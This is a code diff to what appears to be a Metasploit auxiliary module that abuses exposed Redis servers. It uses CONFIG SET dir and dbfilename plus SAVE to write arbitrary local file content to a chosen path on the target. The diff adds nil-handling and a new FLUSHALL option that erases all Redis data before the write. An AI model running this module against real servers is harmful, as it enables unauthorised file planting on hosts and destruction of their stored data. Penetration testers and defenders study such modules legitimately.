@@ -5,7 +5,7 @@
 
 require 'msf/core'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Redis
 
   def initialize(info = {})
@@ -40,7 +40,8 @@ class Metasploit3 < Msf::Auxiliary
       [
         OptPath.new('LocalFile', [false, 'Local file to be uploaded']),
         OptString.new('RemoteFile', [false, 'Remote file path']),
-        OptBool.new('DISABLE_RDBCOMPRESSION', [true, 'Disable compression when saving if found to be enabled', true])
+        OptBool.new('DISABLE_RDBCOMPRESSION', [true, 'Disable compression when saving if found to be enabled', true]),
+        OptBool.new('FLUSHALL', [true, 'Run flushall to remove all redis data before saving', false])
       ]
     )
   end
@@ -54,18 +55,18 @@ class Metasploit3 < Msf::Auxiliary
     # Get the currently configured dir and dbfilename before we overwrite them;
     # we should set them back to their original values after we are done.
     # XXX: this is a hack -- we should really parse the responses more correctly
-    original_dir = redis_command('CONFIG', 'GET', 'dir').split(/\r\n/).last
-    original_dbfilename = redis_command('CONFIG', 'GET', 'dbfilename').split(/\r\n/).last
+    original_dir = (redis_command('CONFIG', 'GET', 'dir') || '').split(/\r\n/).last
+    original_dbfilename = (redis_command('CONFIG', 'GET', 'dbfilename') || '').split(/\r\n/).last
     if datastore['DISABLE_RDBCOMPRESSION']
-      original_rdbcompression = redis_command('CONFIG', 'GET', 'rdbcompression').split(/\r\n/).last
+      original_rdbcompression = (redis_command('CONFIG', 'GET', 'rdbcompression') || '').split(/\r\n/).last
     end
 
     # set the directory which stores the current redis local store
-    data = redis_command('CONFIG', 'SET', 'dir', dirname)
+    data = redis_command('CONFIG', 'SET', 'dir', dirname) || ''
     return unless data.include?('+OK')
 
     # set the file name, relative to the above directory name, that is the redis local store
-    data = redis_command('CONFIG', 'SET', 'dbfilename', basename)
+    data = redis_command('CONFIG', 'SET', 'dbfilename', basename) || ''
     return unless data.include?('+OK')
 
     # Compression string objects using LZF when dump .rdb databases ?
@@ -74,7 +75,7 @@ class Metasploit3 < Msf::Auxiliary
     # the dataset will likely be bigger if you have compressible values or
     # keys.
     if datastore['DISABLE_RDBCOMPRESSION'] && original_rdbcompression.upcase == 'YES'
-      data = redis_command('CONFIG', 'SET', 'rdbcompression', 'no')
+      data = redis_command('CONFIG', 'SET', 'rdbcompression', 'no') || ''
       if data.include?('+OK')
         reset_rdbcompression = true
       else
@@ -83,14 +84,21 @@ class Metasploit3 < Msf::Auxiliary
       end
     end
 
+    if datastore['FLUSHALL']
+      data = redis_command('FLUSHALL') || ''
+      unless data.include?('+OK')
+        print_warning("#{peer} -- failed to flushall(); continuing")
+      end
+    end
+
     # set a key in this db that contains our content
     # XXX: this does not work well (at all) if the content we are uploading is
     # multiline.  It also probably doesn't work well if the content isn't
     # simple ASCII text
     key = Rex::Text.rand_text_alpha(32)
-    data = redis_command('SET', key, content)
+    data = redis_command('SET', key, content) || ''
     return unless data.include?('+OK')
-    data = redis_command('SAVE')
+    data = redis_command('SAVE') || ''
 
     if data.include?('+OK')
       print_good("#{peer} -- saved #{content.size} bytes inside of redis DB at #{path}")
